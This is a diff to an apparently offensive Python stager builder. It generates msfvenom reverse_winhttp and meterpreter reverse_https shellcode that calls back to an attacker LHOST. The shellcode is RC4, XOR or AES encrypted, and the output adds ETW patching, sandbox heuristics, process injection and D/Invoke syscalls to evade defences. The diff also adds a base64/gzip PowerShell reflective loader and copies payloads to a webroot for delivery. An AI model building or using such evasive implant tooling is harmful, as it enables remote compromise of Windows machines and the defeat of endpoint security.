@@ -1,11 +1,14 @@
 #!/bin/env python3
-import ak
-import os
-import re
-import random
-import subprocess
-import shutil
 import argparse
+import base64
+import os
+import random
+import re
+import shutil
+import subprocess
+import zlib
+
+import ak
 
 # Words to use to randomize namespace, class, and function names
 WORDS = open("/usr/share/dict/words").read().splitlines()
@@ -67,11 +70,14 @@ class Stager:
       self.msfvenom_cmd = f"msfvenom -p windows/x64/custom/reverse_winhttp LURI=/hello.woff LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e generic/none"
     elif self.args.msfpayload == 'reverse_https':
       self.msfvenom_cmd = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e generic/none"
+    elif self.args.msfpayload == 'calc':
+      # Pop calc.exe (for testing)
+      self.msfvenom_cmd = f"msfvenom --platform windows --arch x64  -p windows/x64/exec CMD=calc.exe -f raw -e generic/none"
     else:
       print("Invalid msfvenom type")
       sys.exit(1)
 
-    if args.format == "dll":
+    if args.format == "dll" or args.format == "b64":
       self.compiled = True
       self.source_fn = self.args.output + ".cs"
       self.compiled_fn = self.args.output + ".dll"
@@ -140,7 +146,7 @@ class Stager:
     path_obfuscated = ak.Obfuscator(exe_path, XOR_KEY)
 
     # P/Invoke code to import
-    pinvoke_import_list = []
+    syscall_import_list = []
     # C# code to import
     imports = ""
 
@@ -161,7 +167,7 @@ class Stager:
     elif self.encrypt == 'rc4':
       # imports += ak.RC4_DECRYPT_IMPORT
       # main_code += ak.SC_RC4_DECODER.format(enc_key=self.shellcode.get_key_ascii())
-      pinvoke_import_list += ak.SC_SYS32_DECODER_PINVOKE_IMPORT
+      syscall_import_list += ak.SC_SYS32_DECODER_PINVOKE_IMPORT
       imports += ak.SC_SYS32_DECODER_CODE_IMPORT
       main_code += ak.SC_SYS32_DECODER.format(enc_key=self.shellcode.get_key_ascii())
     elif self.encrypt == 'aes':
@@ -173,22 +179,31 @@ class Stager:
       sys.exit()
 
     if self.args.heuristics:
-      pinvoke_import_list += ak.HEURISTICS_PINVOKE_IMPORT
+      syscall_import_list += ak.HEURISTICS_PINVOKE_IMPORT
       main_code += f"{ak.HEURISTICS_CODE}"
 
     if self.args.etw:
-      pinvoke_import_list += ak.ETW_PINVOKE_IMPORT
+      syscall_import_list += ak.ETW_PINVOKE_IMPORT
       imports += f"{ak.ETW_CODE_IMPORT}"
       main_code += f"{ak.ETW_MAIN_CODE}"
 
-    pinvoke_import_list += ak.import_choices_pinvoke_import[self.args.injection]
+    # Syscall import list
+    syscall_import_list += ak.import_choices_syscall_import[self.args.injection]
 
     # Get unique pinvoke imports and randomize
-    pinvoke_import_list = list(set(pinvoke_import_list))
-    random.shuffle(pinvoke_import_list)
+    syscall_import_list = list(set(syscall_import_list))
+    random.shuffle(syscall_import_list)
+
     # Add pinvoke imports
-    for p in pinvoke_import_list:
-      imports += ak.get_pinvoke_import(p)
+    if self.args.invoke == 'pinvoke':
+      for p in syscall_import_list:
+        imports += ak.get_pinvoke_import(p)
+    elif self.args.invoke == 'dinvoke':
+      for d in syscall_import_list:
+        # Delegate 
+        imports += ak.get_dinvoke_import(d) + '\n'
+        # Syscall handling
+        main_code += ak.get_dinvoke_template(d)
 
     imports += ak.import_choices_code_import[self.args.injection]
     main_code += ak.main_choices[self.args.injection].format(ak=ak,
@@ -230,8 +245,11 @@ class Stager:
     
     if self.compiled:
       print("Compiling...")
-      ak.cs_compile(self.source_fn, flags=self.compile_flags)
-      print(f"Compiled {self.compiled_fn}")
+      if ak.cs_compile(self.source_fn, flags=self.compile_flags):
+        print(f"Compiled {self.compiled_fn}")
+      else:
+        print(f"Failed to compile {self.source_fn}")
+        return
 
       # Copy files to webroot
       print(f"*** Copying files to webroot {ak.WEBROOT_DIR}")
@@ -244,25 +262,40 @@ class Stager:
     ak.write_file(self.shellcode_fn, self.shellcode.get_bytes())
 
   def print_ps_loader(self):
-    t = ak.PS_REFLECTIVE_WEBCLIENT.format(LHOST=ak.LHOST,
-                                          tool=self.compiled_fn,
-                                          entrypoint=self.cs_entrypoint,
-                                          tool_namespace=self.cs_namespace,
-                                          tool_classname=self.cs_classname,
-                                          cmd="")
-
     if self.args.format == 'dll' or self.args.format == 'exe':
-        print("Load with:")
-        print(t)
+      t = ak.PS_REFLECTIVE_WEBCLIENT.format(LHOST=ak.LHOST,
+                                            tool=self.compiled_fn,
+                                            entrypoint=self.cs_entrypoint,
+                                            tool_namespace=self.cs_namespace,
+                                            tool_classname=self.cs_classname,
+                                            cmd="")
+      print("Load with:")
+      print(t)
 
+    if self.args.format == 'b64':
+      with open(self.compiled_fn, 'rb') as compiled_file:
+        # Compress with gzip then convert to base64 
+
+        # Workaround (wbits) needed to make a Powershell-usable gzip format
+        gz_payload = zlib.compress(compiled_file.read(), wbits=zlib.MAX_WBITS|16)
+        b64_payload = base64.b64encode(gz_payload)
+
+      t = ak.PS_REFLECTIVE_B64GZ.format(b64_payload=b64_payload.decode('utf-8'),
+                                            entrypoint=self.cs_entrypoint,
+                                            tool_namespace=self.cs_namespace,
+                                            tool_classname=self.cs_classname,
+                                            cmd="")
+      print("Load with: ")
+      print(t)
 
 def main():
   parser = argparse.ArgumentParser()
   parser.add_argument('--injection', '-i', default='earlybird', choices=ak.main_choices.keys())
-  parser.add_argument('--msfpayload', default='reverse_winhttp', choices=['reverse_winhttp', 'reverse_https'])
-  parser.add_argument('--process', default='notepad', help="Process to create, or inject into")
-  parser.add_argument('--format', '-f', default='dll', choices=['exe', 'dll', 'aspx'])
+  parser.add_argument('--msfpayload', default='reverse_winhttp', choices=['reverse_winhttp', 'reverse_https','calc'])
+  parser.add_argument('--process', default='notepad.exe', help="Process to create and/or inject into")
+  parser.add_argument('--format', '-f', default='dll', choices=['exe', 'dll', 'aspx', 'b64'])
   parser.add_argument('--encrypt', '-e', default='rc4', choices=['xor', 'rc4', 'aes'])
+  parser.add_argument('--invoke', default='pinvoke', choices=['pinvoke', 'dinvoke'])
   parser.add_argument('--key', default="", help="Key for AES or RC4")
   parser.add_argument('--iv', default="", help="IV for AES")
   parser.add_argument('--heuristics', default=True, action='store_true')
